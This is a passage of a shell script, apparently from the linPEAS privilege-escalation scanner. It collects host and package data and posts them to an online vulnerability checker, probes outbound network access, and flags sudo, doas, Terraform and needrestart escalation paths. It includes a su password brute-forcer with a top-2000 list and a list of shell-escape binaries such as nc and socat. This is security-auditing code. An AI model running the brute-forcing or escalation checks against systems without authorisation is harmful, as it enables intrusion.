        if (name == "" || name == "-") { name=$3; version=$4 }
        if (version == "" || version == "-") { version=$4 }
        sub(/^src:/, "", name)
        if (name == "" || version == "") next
        printf "%s\t%s\n", name, version
      }' | linpeas_tabbed_packages_to_json_lines "dpkg" "$_ecosystem"
  elif command -v rpm >/dev/null 2>&1; then
    rpm -qa --qf '%{NAME}\t%{VERSION}-%{RELEASE}\n' 2>/dev/null | linpeas_tabbed_packages_to_json_lines "rpm" "$_ecosystem"
  elif command -v apk >/dev/null 2>&1; then
    apk info 2>/dev/null | while IFS= read -r _pkg_name; do
      [ "$_pkg_name" ] || continue
      _pkg_line="$(apk info -e -v "$_pkg_name" 2>/dev/null | head -n 1)"
      _pkg_version="$(printf "%s" "$_pkg_line" | awk -v n="$_pkg_name" 'index($0, n "-") == 1 { print substr($0, length(n) + 2); exit }')"
      [ "$_pkg_version" ] || continue
      printf '{"name":"%s","version":"%s","ecosystem":"%s","manager":"apk"}\n' \
        "$(linpeas_json_escape "$_pkg_name")" "$(linpeas_json_escape "$_pkg_version")" "$(linpeas_json_escape "$_ecosystem")"
    done
  elif command -v pacman >/dev/null 2>&1; then
    pacman -Q 2>/dev/null | linpeas_tabbed_packages_to_json_lines "pacman" "$_ecosystem"
  fi
}
linpeas_packages_json(){
  _limit="${HACKTRICKS_PACKAGE_LIMIT:-300}"
  linpeas_print_package_json_lines | awk -v max="$_limit" '
    BEGIN { first=1; printf "[" }
    NF {
      if (count >= max) next
      if (!first) printf ","
      printf "%s", $0
      first=0
      count++
    }
    END { printf "]" }'
}
linpeas_os_json(){
  _os_id="$(linpeas_os_release_field ID)"
  _os_name="$(linpeas_os_release_field PRETTY_NAME)"
  _os_version_id="$(linpeas_os_release_field VERSION_ID)"
  _os_codename="$(linpeas_os_release_field VERSION_CODENAME)"
  printf '{"id":"%s","name":"%s","version_id":"%s","codename":"%s","kernel":{"release":"%s","version":"%s","arch":"%s"}}' \
    "$(linpeas_json_escape "$_os_id")" \
    "$(linpeas_json_escape "$_os_name")" \
    "$(linpeas_json_escape "$_os_version_id")" \
    "$(linpeas_json_escape "$_os_codename")" \
    "$(linpeas_json_escape "$(uname -r 2>/dev/null)")" \
    "$(linpeas_json_escape "$(uname -v 2>/dev/null)")" \
    "$(linpeas_json_escape "$(uname -m 2>/dev/null)")"
}
linpeas_host_checker_payload(){
  _hostname="$(hostname 2>/dev/null)"
  if [ "$ONLINE_VULN_CHECKS" ]; then
    printf '{"hostname":"%s","source":"linpeas","version":"%s","online_package_check":true,"os":%s,"packages":%s}' \
      "$(linpeas_json_escape "$_hostname")" \
      "$(linpeas_json_escape "$VERSION")" \
      "$(linpeas_os_json)" \
      "$(linpeas_packages_json)"
  else
    printf '{"hostname":"%s","source":"linpeas","version":"%s"}' \
      "$(linpeas_json_escape "$_hostname")" \
      "$(linpeas_json_escape "$VERSION")"
  fi
}
linpeas_start_host_checker_lookup(){
  [ "$NOT_CHECK_EXTERNAL_HOSTNAME" ] && return
  [ "$LINPEAS_HOST_CHECKER_STARTED" ] && return
  INTERNET_SEARCH_TIMEOUT=15
  LINPEAS_HOST_CHECKER_STARTED="1"
  LINPEAS_HOST_CHECKER_OUT="${TMPDIR:-/tmp}/linpeas_host_checker_$$.json"
  LINPEAS_HOST_CHECKER_ERR="${TMPDIR:-/tmp}/linpeas_host_checker_$$.err"
  _hacktricks_host_checker_url="${HACKTRICKS_HOST_CHECKER_URL:-https://tools.hacktricks.wiki/api/host-checker}"
  _hacktricks_payload="$(linpeas_host_checker_payload)"
  if command -v curl >/dev/null 2>&1; then
    (curl -s "$_hacktricks_host_checker_url" -H "User-Agent: linpeas" --data-binary "$_hacktricks_payload" -H "Content-Type: application/json" --max-time "$INTERNET_SEARCH_TIMEOUT" > "$LINPEAS_HOST_CHECKER_OUT" 2>"$LINPEAS_HOST_CHECKER_ERR") &
    LINPEAS_HOST_CHECKER_PID=$!
  elif command -v wget >/dev/null 2>&1; then
    (wget -q -O - "$_hacktricks_host_checker_url" --header "User-Agent: linpeas" --header "Content-Type: application/json" --post-data "$_hacktricks_payload" --timeout "$INTERNET_SEARCH_TIMEOUT" > "$LINPEAS_HOST_CHECKER_OUT" 2>"$LINPEAS_HOST_CHECKER_ERR") &
    LINPEAS_HOST_CHECKER_PID=$!
  else
    printf '{"error":"wget or curl not found"}\n' > "$LINPEAS_HOST_CHECKER_OUT"
  fi
}
linpeas_wait_host_checker_lookup(){
  [ "$NOT_CHECK_EXTERNAL_HOSTNAME" ] && return 1
  linpeas_start_host_checker_lookup
  if [ "$LINPEAS_HOST_CHECKER_PID" ]; then
    wait "$LINPEAS_HOST_CHECKER_PID" 2>/dev/null
    LINPEAS_HOST_CHECKER_PID=""
  fi
  [ -s "$LINPEAS_HOST_CHECKER_OUT" ]
}
linpeas_strip_package_vulns_from_host_response(){
  if command -v jq >/dev/null 2>&1; then
    jq 'del(.package_vulnerabilities)' "$LINPEAS_HOST_CHECKER_OUT" 2>/dev/null && return
  fi
  awk '
    function brace_delta(s, t, opens, closes) {
      t=s; opens=gsub(/{/,"{",t)
      t=s; closes=gsub(/}/,"}",t)
      return opens - closes
    }
    skip {
      depth += brace_delta($0)
      if (depth <= 0) skip=0
      next
    }
    /"package_vulnerabilities"[[:space:]]*:/ {
      sub(/,[[:space:]]*$/, "", prev)
      skip=1
      depth=brace_delta($0)
      if (depth <= 0) skip=0
      next
    }
    {
      if (have) print prev
      prev=$0
      have=1
    }
    END {
      if (have) print prev
    }
  ' "$LINPEAS_HOST_CHECKER_OUT"
}
check_external_hostname(){
  if linpeas_wait_host_checker_lookup; then
    linpeas_strip_package_vulns_from_host_response
  else
    echo "HackTricks host checker did not return data"
  fi
}
linpeas_print_package_vulnerabilities_with_jq(){
  jq -r '
    .package_vulnerabilities as $pv
    | if ($pv == null) then
        empty
      elif (($pv.affected // 0) | tonumber) == 0 then
        "No vulnerable packages found by online lookup (checked \($pv.checked // 0) packages)."
      else
        "Online package vulnerabilities found: \($pv.affected) vulnerable package(s), checked \($pv.checked // 0).",
        (
          $pv.vulnerable_packages[:50][]?
          | "- \(.name // "?") \(.version // "?") [\(.ecosystem // "unknown")]: \((.vulns // []) | join(", "))"
        ),
        (
          if (($pv.vulnerable_packages | length) > 50) then
            "... \((($pv.vulnerable_packages | length) - 50)) more vulnerable package(s) not shown."
          else empty end
        )
      end
  ' "$LINPEAS_HOST_CHECKER_OUT" 2>/dev/null
}
linpeas_print_package_vulnerabilities_with_awk(){
  awk '
    function json_value(line) {
      sub(/^[^:]*:[[:space:]]*"/, "", line)
      sub(/",?[[:space:]]*$/, "", line)
      return line
    }
    function json_number(line) {
      sub(/^[^:]*:[[:space:]]*/, "", line)
      sub(/,?[[:space:]]*$/, "", line)
      return line
    }
    function json_string(line) {
      sub(/^[[:space:]]*"/, "", line)
      sub(/",?[[:space:]]*$/, "", line)
      return line
    }
    function flush_pkg() {
      if (name != "" && version != "") {
        total++
        if (shown < 50) {
          print "- " name " " version " [" (ecosystem != "" ? ecosystem : "unknown") "]: " vulns
          shown++
        }
      }
      name=""; version=""; ecosystem=""; vulns=""; in_vulns=0
    }
    /"package_vulnerabilities"[[:space:]]*:/ { in_pv=1; next }
    in_pv && /"checked"[[:space:]]*:/ { checked=json_number($0); next }
    in_pv && /"affected"[[:space:]]*:/ { affected=json_number($0); next }
    in_pv && /"vulnerable_packages"[[:space:]]*:[[:space:]]*\[/ { in_pkgs=1; next }
    in_pkgs && /"name"[[:space:]]*:/ { name=json_value($0); next }
    in_pkgs && /"version"[[:space:]]*:/ { version=json_value($0); next }
    in_pkgs && /"ecosystem"[[:space:]]*:/ { ecosystem=json_value($0); next }
    in_pkgs && /"vulns"[[:space:]]*:[[:space:]]*\[/ { in_vulns=1; next }
    in_vulns && /"/ {
      v=json_string($0)
      if (v != "") vulns = vulns (vulns != "" ? ", " : "") v
      next
    }
    in_vulns && /\]/ { in_vulns=0; next }
    in_pkgs && /^[[:space:]]*}[,]?[[:space:]]*$/ { flush_pkg(); next }
    END {
      if (affected == "") exit
      if ((affected + 0) == 0) {
        print "No vulnerable packages found by online lookup (checked " (checked != "" ? checked : 0) " packages)."
      } else {
        print "Online package vulnerabilities found: " affected " vulnerable package(s), checked " (checked != "" ? checked : 0) "."
        if (total > 50) print "... " (total - 50) " more vulnerable package(s) not shown."
      }
    }
  ' "$LINPEAS_HOST_CHECKER_OUT" | awk '
    /^Online package vulnerabilities found:/ { header=$0; next }
    /^No vulnerable packages found/ { print; next }
    /^\.\.\. / { more=$0; next }
    /^- / { lines[++count]=$0; next }
    END {
      if (header) print header
      for (i=1; i<=count && i<=50; i++) print lines[i]
      if (more) print more
    }
  '
}
linpeas_print_package_vulnerabilities(){
  [ "$ONLINE_VULN_CHECKS" ] || return
  if ! linpeas_wait_host_checker_lookup; then
    echo "Online package vulnerability lookup did not return data"
    return
  fi
  if command -v jq >/dev/null 2>&1; then
    linpeas_print_package_vulnerabilities_with_jq | sed -${E} "s,CVE-[0-9]{4}-[0-9]+,${SED_RED_YELLOW},g"
  else
    linpeas_print_package_vulnerabilities_with_awk | sed -${E} "s,CVE-[0-9]{4}-[0-9]+,${SED_RED_YELLOW},g"
  fi
}

check_dns(){
  local TIMEOUT_INTERNET_SECONDS_DNS=$1
  if ! [ -f "/bin/bash" ]; then
    echo "  /bin/bash not found"
    return
  fi
  # example.com
  (bash -c '((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"') & local_pid=$!
  sleep $TIMEOUT_INTERNET_SECONDS_DNS && kill -9 $local_pid 2>/dev/null && echo "DNS is not accessible"
}

check_tcp_80(){
  local TIMEOUT_INTERNET_SECONDS_80=$1
  if ! [ -f "/bin/bash" ]; then
    echo "  /bin/bash not found"
    return
  fi
  # example.com
  (bash -c '(echo >/dev/tcp/104.18.74.230/80 2>/dev/null && echo "Port 80 is accessible" && exit 0) 2>/dev/null || echo "Port 80 is not accessible"') & local_pid=$!
  sleep $TIMEOUT_INTERNET_SECONDS_80 && kill -9 $local_pid 2>/dev/null && echo "Port 80 is not accessible"
}

check_icmp(){
  local TIMEOUT_INTERNET_SECONDS_ICMP=$1
  if ! [ "$(command -v ping 2>/dev/null || echo -n '')" ]; then
    echo "  ping not found"
    return
  fi
  # example.com
  ((ping -c 1 1.1.1.1 2>/dev/null | grep -Ei "1 received|1 packets received" && echo "ICMP is accessible" || echo "ICMP is not accessible" 2>/dev/null) | grep "accessible" && exit 0 ) 2>/dev/null || echo "ICMP is not accessible" & local_pid=$!
  sleep $TIMEOUT_INTERNET_SECONDS_ICMP && kill -9 $local_pid 2>/dev/null && echo "ICMP is not accessible"
}

check_command() {
    local cmd=$1
    if command -v "$cmd" >/dev/null 2>&1; then
        if [ -x "$(command -v "$cmd")" ]; then
            return 0
        fi
    fi
    return 1
}

check_if_su_brute(){
  EXISTS_SU="$(command -v su 2>/dev/null || echo -n '')"
  error=$(echo "" | timeout 1 su $(whoami) -c whoami 2>&1);
  if [ "$EXISTS_SU" ] && ! echo $error | grep -q "must be run from a terminal"; then
    echo "1"
  fi
}

su_brute_user_num(){
  BFUSER=$1
  TRIES=$2
  su_try_pwd "$BFUSER" "" &    #Try without password
  su_try_pwd "$BFUSER" "$BFUSER" & #Try username as password
  su_try_pwd "$BFUSER" "$(echo $BFUSER | rev 2>/dev/null)" & #Try reverse username as password
  if [ "$PASSWORD" ]; then
    su_try_pwd "$BFUSER" "$PASSWORD" & #Try given password
  fi
  for i in $(seq "$TRIES"); do
    su_try_pwd "$BFUSER" "$(echo $top2000pwds | cut -d ' ' -f $i)" & #Try TOP TRIES of passwords (by default 2000)
    sleep 0.007 # To not overload the system
  done
  wait
}

tf_plain_path() {
  case "$1" in /*) ;; *) return 1 ;; esac
  case "$1" in *'//'*|*'/./'*|*'/../'*|*'/.'|*'/..') return 1 ;; esac
  tf_walk=
  tf_rest=${1#/}
  while [ "$tf_rest" ]; do
    tf_part=${tf_rest%%/*}
    tf_walk="$tf_walk/$tf_part"
    [ ! -L "$tf_walk" ] || return 1
    case "$tf_rest" in
      */*) tf_rest=${tf_rest#*/} ;;
      *) break ;;
    esac
  done
}
check_sudo_terraform_override() { (
  [ -z "$ROOT_FOLDER" ] || [ "$ROOT_FOLDER" = / ] || return 0
  [ -n "$HOME" ] && [ -d "$HOME" ] || return 0
  # A selected alternate config, or a home-changing Defaults entry, makes the
  # caller's HOME config an unreliable candidate for this narrow check.
  env | grep -q '^TF_CLI_CONFIG_FILE=.' && return 0
  tf_policy=$(printf '%s\n%s\n%s\n' "$1" "$2" "$3" | sed -n '1,400p;401q')
  printf '%s\n' "$tf_policy" | grep -Eq '(^|[[:space:],])!env_reset([[:space:],]|$)' || return 0
  printf '%s\n' "$tf_policy" | grep -Eq '(^|[[:space:],])(always_set_home|set_home)([[:space:],]|$)' && return 0
  # Parse only an exact root-capable terraform -chdir=... apply command.
  # The output is a review clue; sudo's effective policy and HOME remain to be verified.
  tf_rules=$(printf '%s\n' "$tf_policy" | awk '
    /^[[:space:]]*\([^)]*\)[[:space:]]/ {
      line = $0
      runas = line
      sub(/^[^(]*\(/, "", runas); sub(/\).*/, "", runas)
      split(runas, parts, ":")
      users = parts[1]
      if (users ~ /!root/ || users !~ /(^|[[:space:],])(root|ALL)([[:space:],]|$)/) next
      sub(/^.*\)[[:space:]]*/, "", line)
      n = split(line, commands, /,[[:space:]]*/)
      for (i = 1; i <= n; i++) {
        command = commands[i]
        sub(/^[[:space:]]*/, "", command)
        while (command ~ /^(NOPASSWD|PASSWD|SETENV|NOSETENV):[[:space:]]*/)
          sub(/^[A-Z_]+:[[:space:]]*/, "", command)
        sub(/[[:space:]]*$/, "", command)
        if (command ~ /^\/[A-Za-z0-9_.\/-]*\/terraform -chdir=\/[A-Za-z0-9_.\/-]+ apply$/ &&
            command !~ /\/\.\.?\// && ++count <= 4) {
          sub(/^.* -chdir=/, "", command); sub(/ apply$/, "", command)
          if (!seen[command]++) print command
        }
      }
    }
  ')
  [ -n "$tf_rules" ] || return 0
  tf_config="$HOME/.terraformrc"
  tf_plain_path "$tf_config" || return 0
  [ -f "$tf_config" ] && [ -r "$tf_config" ] && [ -w "$tf_config" ] && [ ! -L "$tf_config" ] || return 0
  tf_config_size=$(stat -c %s "$tf_config" 2>/dev/null) ||
    tf_config_size=$(stat -f %z "$tf_config" 2>/dev/null) || return 0
  case "$tf_config_size" in ''|*[!0-9]*) return 0 ;; esac
  [ "$tf_config_size" -le 32768 ] || return 0
  # Only report literal source-to-directory mappings inside dev_overrides.
  # Never print unrelated CLI configuration, which may contain credentials.
  sed -n '1,256p;257q' "$tf_config" 2>/dev/null | awk '
    /^[[:space:]]*provider_installation[[:space:]]*\{/ { installation = 1; next }
    installation && /^[[:space:]]*dev_overrides[[:space:]]*\{/ { overrides = 1; next }
    overrides && /^[[:space:]]*\}/ { overrides = 0; next }
    installation && /^[[:space:]]*\}/ { installation = 0; next }
    overrides && /^[[:space:]]*"[A-Za-z0-9._\/-]+"[[:space:]]*=[[:space:]]*"\/[A-Za-z0-9._\/-]+"[[:space:]]*(#.*)?$/ {
      split($0, fields, "\"")
      if (++count <= 8) print fields[2] "|" fields[4]
    }
  ' | while IFS='|' read -r tf_source tf_override_dir; do
    tf_plain_path "$tf_override_dir" || continue
    [ -d "$tf_override_dir" ] && [ -w "$tf_override_dir" ] &&
      [ -x "$tf_override_dir" ] && [ ! -L "$tf_override_dir" ] || continue
    tf_provider_name=${tf_source##*/}
    tf_binary="$tf_override_dir/terraform-provider-$tf_provider_name"
    tf_plain_path "$tf_binary" || continue
    if [ -e "$tf_binary" ] || [ -L "$tf_binary" ]; then
      [ -f "$tf_binary" ] && [ -w "$tf_binary" ] &&
        [ -x "$tf_binary" ] && [ ! -L "$tf_binary" ] || continue
      tf_binary_access='caller-writable executable exists'
    else
      tf_binary_access='caller can create executable in override directory'
    fi
    printf '%s\n' "$tf_rules" | while IFS= read -r tf_rule_dir; do
      tf_plain_path "$tf_rule_dir" || continue
      [ -d "$tf_rule_dir" ] && [ ! -L "$tf_rule_dir" ] || continue
      tf_source_seen=
      tf_project_count=0
      for tf_project_file in "$tf_rule_dir"/*.tf; do
        tf_plain_path "$tf_project_file" || continue
        [ -f "$tf_project_file" ] && [ ! -L "$tf_project_file" ] || continue
        tf_project_count=$((tf_project_count + 1))
        [ "$tf_project_count" -le 8 ] || break
        tf_project_size=$(stat -c %s "$tf_project_file" 2>/dev/null) ||
          tf_project_size=$(stat -f %z "$tf_project_file" 2>/dev/null) || continue
        case "$tf_project_size" in ''|*[!0-9]*) continue ;; esac
        [ "$tf_project_size" -le 32768 ] || continue
        if sed -n '1,256p;257q' "$tf_project_file" 2>/dev/null | awk -v wanted="$tf_source" '
          /^[[:space:]]*source[[:space:]]*=/ {
            split($0, fields, "\"")
            if (fields[2] == wanted) found = 1
          }
          END { exit !found }
        '; then
          tf_source_seen=1
          break
        fi
      done
      [ "$tf_source_seen" ] || continue
      printf 'Terraform sudo/provider override review candidate: root rule uses -chdir=%s apply; current HOME config %s is caller-writable\n' "$tf_rule_dir" "$tf_config"
      printf 'Provider source %s matches a bounded .tf file; override directory %s; %s: %s\n' "$tf_source" "$tf_override_dir" "$tf_binary_access" "$tf_binary"
      ls -ld "$tf_config" "$tf_override_dir" "$tf_binary" 2>/dev/null
      printf 'Verify effective sudo HOME, policy, provider loading, and execution context; this is candidate evidence, not proven root privilege.\n'
    done
  done
); }

lp_trusted_version_path() { (
  # Never execute a program solely because a readable configuration names it.
  # Execute the checked canonical path, not a replaceable symlink spelling.
  case "$1" in /*) ;; *) exit 1 ;; esac
  lp_version_path=$(readlink -f "$1" 2>/dev/null) ||
    lp_version_path=$(realpath "$1" 2>/dev/null) || exit 1
  case "$lp_version_path" in /*) ;; *) exit 1 ;; esac
  [ "${#lp_version_path}" -le 4096 ] &&
    [ -f "$lp_version_path" ] && [ -x "$lp_version_path" ] || exit 1
  lp_version_uid=$(id -u 2>/dev/null) || exit 1
  lp_version_walk=$lp_version_path
  lp_version_count=0
  while :; do
    lp_version_count=$((lp_version_count + 1))
    [ "$lp_version_count" -le 64 ] && [ ! -L "$lp_version_walk" ] || exit 1
    # Numeric ownership and symbolic mode work on GNU, BSD and BusyBox ls.
    LC_ALL=C ls -ldn "$lp_version_walk" 2>/dev/null | awk '
      NR == 1 && $3 == "0" && length($1) >= 10 &&
          substr($1, 6, 1) != "w" && substr($1, 9, 1) != "w" { safe = 1 }
      END { exit !safe }
    ' || exit 1
    if [ "$lp_version_uid" != 0 ] && [ -w "$lp_version_walk" ]; then exit 1; fi
    [ "$lp_version_walk" != / ] || break
    lp_version_walk=${lp_version_walk%/*}
    [ -n "$lp_version_walk" ] || lp_version_walk=/
  done
  printf '%s\n' "$lp_version_path"
) }

get_current_user_privot_pid(){
    CURRENT_USER_PIVOT_PID=""
    if ! [ "$SEARCH_IN_FOLDER" ] && ! [ "$NOUSEPS" ]; then
        # Function to get user by PID
        get_user_by_pid() {
            ps -p "$1" -o user | grep -v "USER"
        }
        # Find processes with PPID and user info, then filter those where PPID's user is different from the process's user
        ps -eo pid,ppid,user | grep -v "PPID" | while read -r pid ppid user; do
            if [ "$ppid" = "0" ]; then
            continue
            fi
            ppid_user=$(get_user_by_pid "$ppid")
            if echo "$user" | grep -Eqv "$ppid_user|root$"; then
            if [ "$ppid_user" = "$USER" ]; then
                CURRENT_USER_PIVOT_PID="$ppid"
            fi
            fi
        done
        echo ""
    fi
}

doas_extract_upstream_version() {
  printf "%s\n" "$1" | grep -oE '[0-9]+(\.[0-9]+){1,2}' | head -n 1
}
doas_version_ge() {
  awk -v left="$1" -v right="$2" 'BEGIN {
    left_n = split(left, left_v, ".")
    right_n = split(right, right_v, ".")
    max_n = left_n > right_n ? left_n : right_n
    for (i = 1; i <= max_n; i++) {
      left_i = (i <= left_n ? left_v[i] : 0) + 0
      right_i = (i <= right_n ? right_v[i] : 0) + 0
      if (left_i > right_i) exit 0
      if (left_i < right_i) exit 1
    }
    exit 0
  }'
}
doas_version_lt() {
  if doas_version_ge "$1" "$2"; then
    return 1
  fi
  return 0
}
doas_version_le() {
  if doas_version_lt "$2" "$1"; then
    return 1
  fi
  return 0
}
doas_read_rules() {
  awk '
    function trim(value) {
      sub(/^[[:space:]]+/, "", value)
      sub(/[[:space:]]+$/, "", value)
      return value
    }
    {
      source = $0
      output = ""
      quoted = 0
      escaped = 0
      for (i = 1; i <= length(source); i++) {
        char = substr(source, i, 1)
        if (char == "#" && !quoted) break
        output = output char
        if (char == "\"" && !escaped) quoted = !quoted
        if (char == "\\" && !escaped) escaped = 1
        else escaped = 0
      }
      output = trim(output)
      if (output ~ /^(permit|deny)([[:space:]]|$)/)
        printf "%d\t%s\n", NR, output
    }
  ' "$1" 2>/dev/null
}
doas_rule_identity() {
  printf "%s\n" "$1" | awk '
    {
      in_setenv = 0
      for (i = 2; i <= NF; i++) {
        token = $i
        if (in_setenv) {
          if (token ~ /}/) in_setenv = 0
          continue
        }
        if (token == "setenv") {
          in_setenv = 1
          continue
        }
        if (token == "nopass" || token == "nolog" || token == "persist" || token == "keepenv")
          continue
        gsub(/^"|"$/, "", token)
        print token
        exit
      }
    }
  '
}
doas_rule_has_option() {
  printf "%s\n" "$1" | awk -v wanted="$2" '
    {
      in_setenv = 0
      for (i = 2; i <= NF; i++) {
        token = $i
        if (in_setenv) {
          if (token ~ /}/) in_setenv = 0
          continue
        }
        if (token == "setenv") {
          if (wanted == token) exit 0
          in_setenv = 1
          continue
        }
        if (token == "nopass" || token == "nolog" || token == "persist" || token == "keepenv") {
          if (wanted == token) exit 0
          continue
        }
        exit 1
      }
      exit 1
    }
  '
}
doas_rule_has_dangerous_environment() {
  if doas_rule_has_option "$1" keepenv; then
    return 0
  fi
  printf "%s\n" "$1" | grep -Eq '(^|[[:space:]{])(setenv[[:space:]]*\{[^}]*[[:space:]])?(PATH|LD_PRELOAD|LD_LIBRARY_PATH|BASH_ENV|ENV|PYTHONPATH|PERL5LIB|RUBYLIB)([=[:space:]}]|$)'
}
doas_rule_command() {
  printf "%s\n" "$1" | awk '
    {
      for (i = 1; i < NF; i++) {
        if ($i == "cmd") {
          command = $(i + 1)
          gsub(/^"|"$/, "", command)
          print command
          exit
        }
      }
    }
  '
}
doas_rule_targets_root() {
  printf "%s\n" "$1" | awk '
    {
      for (i = 1; i < NF; i++) {
        if ($i == "as") {
          target = $(i + 1)
          gsub(/^"|"$/, "", target)
          exit(target == "root" || target == "0" || target == "#0" ? 0 : 1)
        }
      }
      exit 0
    }
  '
}
doas_rule_applies_to_current_user() {
  doas_rule_identity_value="$(doas_rule_identity "$1")"
  case "$doas_rule_identity_value" in
    "$doas_current_user"|"$doas_current_uid"|"#$doas_current_uid") return 0 ;;
  esac
  case "$doas_rule_identity_value" in
    :*)
      doas_rule_identity_value="${doas_rule_identity_value#:}"
      for doas_candidate in $doas_current_groups $doas_current_gids; do
        if [ "$doas_candidate" = "$doas_rule_identity_value" ] || [ "#$doas_candidate" = "$doas_rule_identity_value" ]; then
          return 0
        fi
      done
      ;;
  esac
  return 1
}
doas_command_is_dangerous() {
  doas_rule_cmd="$1"
  doas_rule_cmd="${doas_rule_cmd##*/}"
  case "$doas_rule_cmd" in
    ash|awk|bash|busybox|csh|dash|dstat|ed|env|expect|find|fish|gdb|git|ionice|jrunscript|ksh|less|lua|make|more|mv|nano|nawk|nc|ncat|nice|node|nvim|perl|php|python|python2|python3|rake|rlwrap|ruby|run-parts|rvim|sed|sh|socat|sqlite3|tar|tee|tclsh|vi|vim|watch|xargs|zsh)
      return 0
      ;;
  esac
  if [ -n "${sudoVB1:-}" ] && printf " %s\n" "$1" | grep -Eq "$sudoVB1" 2>/dev/null; then
    return 0
  fi
  if [ -n "${sudoVB2:-}" ] && printf " %s\n" "$1" | grep -Eq "$sudoVB2" 2>/dev/null; then
    return 0
  fi
  return 1
}
doas_get_package_details() {
  doas_package_manager=""
  doas_package_name=""
  doas_package_full_version=""
  doas_package_source=""
  doas_package_homepage=""
  doas_package_implementation="unknown"
  if command -v dpkg-query >/dev/null 2>&1; then
    doas_package_name="$(dpkg-query -S "$1" 2>/dev/null | head -n 1 | sed 's/: .*//' | cut -d: -f1)"
    if [ -n "$doas_package_name" ]; then
      doas_package_manager="dpkg"
      doas_package_full_version="$(dpkg-query -W -f='$''{Version}\n' "$doas_package_name" 2>/dev/null | head -n 1)"
      doas_package_source="$(dpkg-query -W -f='$''{source:Package}\n' "$doas_package_name" 2>/dev/null | head -n 1 | sed 's/^src://')"
      doas_package_homepage="$(dpkg-query -W -f='$''{Homepage}\n' "$doas_package_name" 2>/dev/null | head -n 1)"
    fi
  elif command -v rpm >/dev/null 2>&1; then
    doas_package_line="$(rpm -qf --qf '%{NAME}|%{VERSION}-%{RELEASE}|%{URL}\n' "$1" 2>/dev/null | head -n 1)"
    if [ -n "$doas_package_line" ]; then
      doas_package_manager="rpm"
      doas_package_name="$(printf "%s" "$doas_package_line" | cut -d'|' -f1)"
      doas_package_full_version="$(printf "%s" "$doas_package_line" | cut -d'|' -f2)"
      doas_package_homepage="$(printf "%s" "$doas_package_line" | cut -d'|' -f3-)"
    fi
  elif command -v apk >/dev/null 2>&1; then
    for doas_candidate in opendoas doas; do
      doas_candidate_version="$(apk info -e -v "$doas_candidate" 2>/dev/null | head -n 1)"
      if [ -n "$doas_candidate_version" ]; then
        doas_package_manager="apk"
        doas_package_name="$doas_candidate"
        doas_package_full_version="${doas_candidate_version#${doas_candidate}-}"
        doas_package_homepage="$(apk info -a "$doas_candidate" 2>/dev/null | sed -n 's/^webpage[[:space:]]*:[[:space:]]*//p' | head -n 1)"
        break
      fi
    done
  elif command -v pacman >/dev/null 2>&1; then
    doas_package_line="$(pacman -Qo "$1" 2>/dev/null | head -n 1)"
    doas_package_name="$(printf "%s\n" "$doas_package_line" | sed -nE 's/.* is owned by ([^ ]+) .*/\1/p')"
    doas_package_full_version="$(printf "%s\n" "$doas_package_line" | sed -nE 's/.* is owned by [^ ]+ ([^ ]+).*/\1/p')"
    if [ -n "$doas_package_name" ]; then
      doas_package_manager="pacman"
      doas_package_homepage="$(pacman -Qi "$doas_package_name" 2>/dev/null | sed -n 's/^URL[[:space:]]*:[[:space:]]*//p' | head -n 1)"
    fi
  elif command -v pkg >/dev/null 2>&1; then
    doas_package_name="$(pkg which -q "$1" 2>/dev/null | head -n 1)"
    if [ -n "$doas_package_name" ]; then
      doas_package_manager="pkg"
      doas_package_line="$(pkg query '%n|%v|%o|%w' "$doas_package_name" 2>/dev/null | head -n 1)"
      doas_package_name="$(printf "%s" "$doas_package_line" | cut -d'|' -f1)"
      doas_package_full_version="$(printf "%s" "$doas_package_line" | cut -d'|' -f2)"
      doas_package_source="$(printf "%s" "$doas_package_line" | cut -d'|' -f3)"
      doas_package_homepage="$(printf "%s" "$doas_package_line" | cut -d'|' -f4-)"
    fi
  fi
  doas_homepage_lower="$(printf "%s" "$doas_package_homepage" | tr '[:upper:]' '[:lower:]')"
  case "$doas_homepage_lower:$doas_package_source:$doas_package_name" in
    *duncaen/opendoas*|*:opendoas:*|*:*:opendoas) doas_package_implementation="opendoas" ;;
    *slicer69/doas*) doas_package_implementation="slicer69" ;;
  esac
  if [ "$(uname -s 2>/dev/null)" = "OpenBSD" ]; then
    doas_package_implementation="openbsd"
  fi
}
doas_config_syntax_valid() {
  if [ -n "${TIMEOUT:-}" ]; then
    "$TIMEOUT" 5 "$1" -C "$2" >/dev/null 2>&1
  else
    "$1" -C "$2" >/dev/null 2>&1
  fi
}
doas_check_command() {
  if [ -n "${TIMEOUT:-}" ]; then
    "$TIMEOUT" 5 "$1" -C "$2" "$3" 2>/dev/null
  else
    "$1" -C "$2" "$3" 2>/dev/null
  fi
}

nr48990_fixed_dpkg_version() {
  # Vendor backports from Ubuntu CVE-2024-48990 and Debian DSA-5815-1 /
  # DLA-3957-1; comparing only the upstream 3.8 version would misclassify them.
  case "$1:$2" in
    debian:bullseye|raspbian:bullseye) echo "3.5-4+deb11u4" ;;
    debian:bookworm|raspbian:bookworm) echo "3.6-4+deb12u2" ;;
    debian:trixie|debian:forky|debian:sid) echo "3.7-3.1" ;;
    ubuntu:xenial) echo "2.6-1ubuntu0.1~esm1" ;;
    ubuntu:bionic) echo "3.1-1ubuntu0.1+esm1" ;;
    ubuntu:focal) echo "3.4-6ubuntu0.1+esm1" ;;
    ubuntu:jammy) echo "3.5-5ubuntu2.2" ;;
    ubuntu:noble) echo "3.6-7ubuntu4.3" ;;
    ubuntu:oracular) echo "3.6-8ubuntu4.2" ;;
    ubuntu:plucky) echo "3.6-8ubuntu6" ;;
  esac
}
nr48990_effective_interpscan() {
  nr48990_config="1"
  for nr48990_config_file in "$1"etc/needrestart/needrestart.conf "$1"etc/needrestart/conf.d/*.conf; do
    [ -r "$nr48990_config_file" ] || continue
    nr48990_config_file_value="$(awk '
      /^[[:space:]]*#/ { next }
      {
        nr48990_line = $0
        sub(/[[:space:]]*#.*/, "", nr48990_line)
        if (nr48990_line ~ /^[[:space:]]*[$]nrconf[[:space:]]*\{[[:space:]]*[\047\042]?interpscan[\047\042]?[[:space:]]*\}[[:space:]]*=[[:space:]]*[01][[:space:]]*;/) {
          sub(/^.*=[[:space:]]*/, "", nr48990_line)
          sub(/[[:space:]]*;.*/, "", nr48990_line)
          print nr48990_line
        }
      }
    ' "$nr48990_config_file" 2>/dev/null | tail -n1)"
